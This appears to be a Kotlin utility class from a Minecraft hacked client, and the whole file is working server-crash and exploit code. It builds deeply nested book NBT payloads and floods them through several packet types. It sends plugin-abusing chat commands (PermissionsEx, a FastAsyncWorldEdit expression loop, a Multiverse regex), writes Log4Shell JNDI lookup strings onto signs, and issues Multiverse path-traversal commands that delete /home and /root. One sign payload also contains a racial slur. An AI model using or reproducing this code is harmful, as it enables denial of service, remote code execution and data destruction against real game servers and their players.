package just.monika.LiteraruteMC.Lucky.utils

import io.netty.buffer.Unpooled
import just.monika.LiteraruteMC.Lucky.ui.notifications.NotificationManager
import just.monika.LiteraruteMC.Lucky.ui.notifications.NotificationType
import just.monika.LiteraruteMC.Lucky.utils.CrashUtils.CrashType.*
import just.monika.LiteraruteMC.Lucky.utils.network.PacketUtils
import net.minecraft.client.Minecraft
import net.minecraft.init.Items
import net.minecraft.item.Item
import net.minecraft.item.ItemStack
import net.minecraft.nbt.NBTTagCompound
import net.minecraft.nbt.NBTTagList
import net.minecraft.nbt.NBTTagString
import net.minecraft.network.PacketBuffer
import net.minecraft.network.play.client.*
import net.minecraft.network.play.client.C03PacketPlayer.C04PacketPlayerPosition
import net.minecraft.util.BlockPos
import net.minecraft.util.ChatComponentText
import net.minecraft.util.IChatComponent
import org.apache.commons.lang3.RandomStringUtils
import java.util.*
import java.util.concurrent.ThreadLocalRandom


class CrashUtils {
    var unicode = arrayOf(
        "م",
        "⾟", "✈", "龜", "樓", "ᳱ", "ᳩ", "ᳫ", "ᳬ", "᳭", "ᳮ", "ᳯ", "ᳰ", "⿓", "⿕",
        "⿔", "\uD803\uDE60", "\uD803\uDE65", "ᮚ", "ꩶ", "꩷", "㉄", "Ὦ", "Ἇ", "ꬱ",
        "ꭑ", "ꭐ", "\uAB67", "ɸ", "Ａ", "\u007F"
    ) //31
    var lpx = "...................................................Ѳ2.6602355499702653E8" //12;
    var netty =
        ".........................................................................................................................." +
                "..........................................................................................................................................." +
                "..........................................................................................................................................." +
                "..........................................................................................................................................." +
                "............................................................................................................................................" +
                "..........................................................................................................................................." +
                "..........................................................................................................................................." +
                "..........................................................................................................................................." +
                "............................................................................................................................................." +
                "............................................................................................................................................." +
                "............................................................................................................................................." +
                "..............................................................................................................................................." +
                ".............................................................................................................................................." +
                "....................................................................................................................................................." //12
    var pexcrashexp1 = "/pex promote a a"
    var pexcrashexp2 = "/pex promote b b"
    var mv = "/Mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^"
    var fawe = "/to for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}"
    var pdw = "{\"petya.exe\":\"\${jndi:rmi://du.pa}\"}}"
    var pdw2 =
        "{\"petya.exe\":\"\${jndi:rmi://google.com/a}\${jndi:rmi://google.com/a}\${jndi:rmi://google.com/a}\${jndi:rmi://google.com/a}\${jndi:rmi://google.com/a}\${jndi:rmi://google.com/a}\${jndi:rmi://google.com/a}\${jndi:rmi://google.com/a}\${jndi:rmi://google.com/a}\${jndi:rmi://google.com/a}\"}}"
    var oldmv = arrayOf(
        "/mv import ../../../../../home normal -t flat",
        "/mv import ../../../../../root normal -t flat",
        "/mv delete ../../../../../home",
        "/mv confirm",
        "/mv delete ../../../../../root",
        "/mv confirm"
    )
    var buffertype = arrayOf("MC|BSign", "MC|BEdit")
    fun AlphabeticRandom(count: Int): String {
        return RandomStringUtils.randomAlphabetic(count)
    }

    fun NumberRandom(count: Int): String {
        return RandomStringUtils.randomNumeric(count)
    }

    fun AsciirRandom(count: Int): String {
        return RandomStringUtils.randomAscii(count)
    }

    fun oneBlockCrash(stack: ItemStack?) {
        PacketUtils.sendPacketNoEvent(
            C08PacketPlayerBlockPlacement(
                BlockPos(
                    Minecraft.getMinecraft().thePlayer.posX,
                    Minecraft.getMinecraft().thePlayer.posY - Random().nextFloat() - 1.0f,
                    Minecraft.getMinecraft().thePlayer.posZ
                ), Random().nextInt(255), stack, 0.0f, 0.0f, 0.0f
            )
        )
    }

    fun payload1(stack: ItemStack?) {
        val packetBuffer = PacketBuffer(Unpooled.buffer())
        packetBuffer.writeItemStackToBuffer(stack)
        PacketUtils.sendPacketNoEvent(C17PacketCustomPayload("MC|BEdit", packetBuffer))
    }

    fun payload2(stack: ItemStack?) {
        val packetBuffer = PacketBuffer(Unpooled.buffer())
        packetBuffer.writeItemStackToBuffer(stack)
        PacketUtils.sendPacketNoEvent(
            C17PacketCustomPayload(
                buffertype[ThreadLocalRandom.current().nextInt(1)], packetBuffer
            )
        )
    }

    fun creatandpayload(stack: ItemStack?) {
        val packetBuffer = PacketBuffer(Unpooled.buffer())
        packetBuffer.writeItemStackToBuffer(stack)
        PacketUtils.sendPacketNoEvent(C10PacketCreativeInventoryAction(0, stack))
        PacketUtils.sendPacketNoEvent(C17PacketCustomPayload("MC|BEdit", packetBuffer))
    }

    fun creatandplace(stack: ItemStack?) {
        PacketUtils.sendPacketNoEvent(C10PacketCreativeInventoryAction(0, stack))
        PacketUtils.sendPacketNoEvent(
            C08PacketPlayerBlockPlacement(
                BlockPos(
                    Minecraft.getMinecraft().thePlayer.posX,
                    Minecraft.getMinecraft().thePlayer.posY - Random().nextFloat() - 1.0f,
                    Minecraft.getMinecraft().thePlayer.posZ
                ), Random().nextInt(255), stack, 0.0f, 0.0f, 0.0f
            )
        )
    }

    fun click(stack: ItemStack?) {
        PacketUtils.sendPacketNoEvent(C0EPacketClickWindow(0, Int.MIN_VALUE, 0, 0, stack, 0.toShort()))
    }

    fun creatandclick(stack: ItemStack?) {
        PacketUtils.sendPacketNoEvent(C10PacketCreativeInventoryAction(Int.MIN_VALUE, stack))
        PacketUtils.sendPacketNoEvent(C0EPacketClickWindow(0, Int.MIN_VALUE, 0, 3, stack, 0.toShort()))
    }

    fun justcreate(stack: ItemStack?) {
        PacketUtils.sendPacketNoEvent(C10PacketCreativeInventoryAction(-999, stack))
    }

    fun custombyte(amount: Int) {
        val x = Minecraft.getMinecraft().thePlayer.posX
        var y = Minecraft.getMinecraft().thePlayer.posY
        val z = Minecraft.getMinecraft().thePlayer.posZ
        for (j in 0 until amount) {
            val i = ThreadLocalRandom.current().nextDouble(0.4, 1.2)
            if (y > 255) y = 255.0
            Minecraft.getMinecraft().netHandler.addToSendQueue(C04PacketPlayerPosition(x, y, z, false))
            Minecraft.getMinecraft().netHandler.addToSendQueue(C04PacketPlayerPosition(x, y, z, true))
        }
    }

    fun testCrash(CrashType: String, value: Int) {
        try {
            when (CrashType.lowercase(Locale.getDefault())) {
                "pex" -> {
                    PacketUtils.sendPacketNoEvent(C01PacketChatMessage(pexcrashexp1))
                    PacketUtils.sendPacketNoEvent(C01PacketChatMessage(pexcrashexp2))
                }
                "fawe" -> PacketUtils.sendPacketNoEvent(C01PacketChatMessage(fawe))
                "mv" -> PacketUtils.sendPacketNoEvent(C01PacketChatMessage(mv))
                "position" -> custombyte(value)
                "rsc1" -> {
                    val iTextComponentArray = arrayOf<IChatComponent>(
                        ChatComponentText(""),
                        ChatComponentText(""),
                        ChatComponentText(""),
                        ChatComponentText("")
                    )
                    iTextComponentArray[0] = ChatComponentText(pdw)
                    PacketUtils.sendPacketNoEvent(C12PacketUpdateSign(BlockPos.ORIGIN, iTextComponentArray))
                }
                "rsc2" -> PacketUtils.sendPacketNoEvent(
                    C12PacketUpdateSign(
                        BlockPos.ORIGIN,
                        arrayOf<IChatComponent>(
                            ChatComponentText(pdw2),
                            ChatComponentText("nigga"),
                            ChatComponentText("doyoulovemekid"),
                            ChatComponentText("ezmyfriend")
                        )
                    )
                )
                "netty" -> crashdemo("a", 0, 1500, 5, false, PLACE, value)
                else -> NotificationManager.post(NotificationType.WARNING,"Can not find crash type","1145141919810")
            }
        } catch (e: Exception) {
        }
    }

    fun crashdemo(
        sign: String?,
        booktype: Int,
        bookvalue: Int,
        redo: Int,
        customedit: Boolean,
        type: CrashType?,
        amount: Int
    ) {
        var size: Int
        val compound = NBTTagCompound()
        val tagList = NBTTagList()
        val builder = StringBuilder()
        val hold: Item = when (booktype) {
            0 -> Items.writable_book
            1 -> Items.book
            2 -> Items.written_book
            else -> Items.written_book
        }
        if (customedit) {
            builder.append(sign)
        } else {
            builder.append("{")
            size = 0
            while (size < bookvalue) {
                builder.append("extra:[{")
                ++size
            }
            size = 0
            while (size < bookvalue) {
                builder.append("text:").append(sign).append("}],")
                ++size
            }
            builder.append("text:").append(sign).append("}")
        }
        size = 0
        while (size < redo) {
            tagList.appendTag(NBTTagString(builder.toString()))
            ++size
        }
        compound.setString("author", Minecraft.getMinecraft().getSession().getUsername())
        compound.setString("title", "Hanabi" + AlphabeticRandom(5))
        compound.setByte("resolved", 1.toByte())
        compound.setTag("pages", tagList)
        val stack = ItemStack(hold)
        stack.tagCompound = compound
        var packet = 0
        while (packet++ < amount) {
            when (type) {
                PLACE -> oneBlockCrash(stack)
                CLICK -> click(stack)
                PAYLOAD1 -> payload1(stack)
                PAYLOAD2 -> payload2(stack)
                CAP -> creatandplace(stack)
                CAC -> creatandclick(stack)
                CAPL -> creatandpayload(stack)
                CREATE -> justcreate(stack)
                null -> TODO()
            }
        }
    }

    enum class CrashType {
        PLACE, CLICK, PAYLOAD1, PAYLOAD2, CAP, CAC, CAPL, CREATE
    } //TODO: GUI For Crasher // Netty Crasher // Non - Burst Crasher // Multi Tags Crasher // Non Book Make Crasher
    //PlayerUtil.debug(Hanabi.aesUtil.AESEncode(String.valueOf(packetBuffer))); Thread.sleep(delay);
}